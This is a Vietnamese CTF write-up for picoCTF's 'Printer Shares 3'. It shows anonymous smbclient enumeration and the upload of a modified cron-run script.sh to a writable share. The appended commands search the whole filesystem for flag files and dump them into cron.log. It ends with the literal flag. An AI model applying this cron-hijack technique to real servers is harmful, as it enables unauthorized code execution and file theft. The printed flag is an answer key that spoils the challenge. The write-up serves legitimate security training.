<img width="930" height="718" alt="image" src="https://github.com/user-attachments/assets/bbcdf02a-8db7-46bb-93ec-899a58bcc6e0" />
Writeup: Printer Shares 3 (picoCTF)

Tác giả: Janice He

Mục tiêu: Khai thác lỗ hổng cấu hình sai trên dịch vụ SMB chia sẻ máy in để đọc được file cờ (flag) nằm trong thư mục bảo mật.

Target (Port mới): dolphin-cove.picoctf.net:61687

1. Phân tích thông tin ban đầu (Reconnaissance)
   
Dựa vào mô tả của đề bài nhắc đến "Printer shares" (chia sẻ máy in) cùng với hai thư mục "private" và "public",
chúng ta có thể đoán ngay mục tiêu đang chạy dịch vụ SMB (Samba).

Bước đầu tiên là liệt kê các thư mục đang được chia sẻ (Shares) trên máy chủ thông qua cổng 61687 bằng tính năng đăng nhập ẩn danh (Null session):

Bash
smbclient -L //dolphin-cove.picoctf.net -p 61687 -N

Kết quả thu được:

Hệ thống trả về 2 thư mục chia sẻ chính:

shares: Public Share With Guests (Thư mục công khai)

secure-shares: Printer for internal usage only (Thư mục bảo mật chứa nội dung quan trọng)

2. Xâm nhập và Thu thập thông tin (Enumeration)
   
Chúng ta tiến hành kết nối vào thư mục công khai shares vì đây là nơi dành cho tài khoản Guest:

Bash
smbclient //dolphin-cove.picoctf.net/shares -p 61687 -N

Khi đã vào được giao diện smb: \>, sử dụng lệnh ls để liệt kê các tệp tin. 
Chúng ta phát hiện hai tệp đáng chú ý: script.sh (debug script mà tác giả đã bỏ quên) và cron.log.

Tiến hành tải cả hai tệp này về máy Kali để phân tích:

Bash
smb: \> get script.sh
smb: \> get cron.log
smb: \> exit

3. Phân tích lỗ hổng (Vulnerability Analysis)
   
Kiểm tra nội dung tệp script.sh trên máy Kali:

Bash
cat script.sh

Nội dung script:

Bash
#!/bin/bash

echo "Health Check: $(date)"

Nhận định: Dòng comment # this script runs every minute và file cron.log liên tục tăng dung lượng cho thấy hệ thống đang sử dụng Cron Job để tự động thực thi tệp script.sh này mỗi phút một lần.
Điểm chí mạng ở đây là: Thư mục shares trên SMB cho phép quyền ghi (write/upload). Điều này dẫn đến lỗ hổng Remote Code Execution (RCE) thông qua việc thao túng Cron job. Chúng ta có thể sửa tệp script.sh này, chèn các lệnh Linux độc hại vào và ghi đè lên máy chủ. Khi đến phút tiếp theo, máy chủ sẽ tự động chạy các lệnh của chúng ta.

4. Khai thác (Exploitation)
   
Chúng ta sẽ chèn lệnh tìm kiếm toàn bộ các tệp có tên chứa chữ "flag" trên máy chủ và xuất nội dung của chúng vào tệp cron.log để tải về.
Mở terminal trên Kali và chạy các lệnh sau để nối mã độc vào cuối tệp script.sh:

Bash
echo 'echo "=== HACKED ===" >> /tmp/cron.log' >> script.sh
echo 'find / -type f -name "*flag*" -exec cat {} + >> cron.log 2>/dev/null' >> script.sh
(Ghi chú: Lệnh find sẽ tìm tệp flag trong hệ thống, bao gồm cả thư mục secure-shares, và in kết quả vào tệp log).

Kết nối lại vào SMB để đẩy tệp script đã bị sửa đổi lên máy chủ nhằm ghi đè tệp gốc:

Bash
smbclient //dolphin-cove.picoctf.net/shares -p 61687 -N
Bash
smb: \> put script.sh

5. Thu hoạch Cờ (Get Flag)
   
Sau khi upload thành công, chúng ta chờ khoảng 1 đến 2 phút để tiến trình cron trên máy chủ được kích hoạt.

Vẫn trong giao diện smbclient, tiến hành tải tệp log mới nhất về và thoát:

Bash
smb: \> get cron.log
smb: \> exit
Cuối cùng, đọc tệp cron.log trên máy Kali:

Bash
cat cron.log

<img width="944" height="768" alt="image" src="https://github.com/user-attachments/assets/fa360150-0aa4-4b2c-9437-dada1d9162e0" />

<img width="1668" height="830" alt="image" src="https://github.com/user-attachments/assets/dac54ffe-87e6-4be3-afc3-80094a8773a0" />

Kéo xuống cuối tệp, bên dưới dòng chữ === HACKED ===, nội dung của cờ với định dạng picoCTF{...} đã được trích xuất thành công!

<img width="983" height="780" alt="image" src="https://github.com/user-attachments/assets/993a8a14-55f2-4c26-b4de-fe72d8e5a0fc" />

picoCTF{5mb_pr1nter_5h4re5_r3v3r53_4c0ffa48}

Cảm ơn các bạn đã đọc bài viết của tôi . Chúc các bạn giải thử thách thành công . Wish you have all the best!!!!!!!!!!!

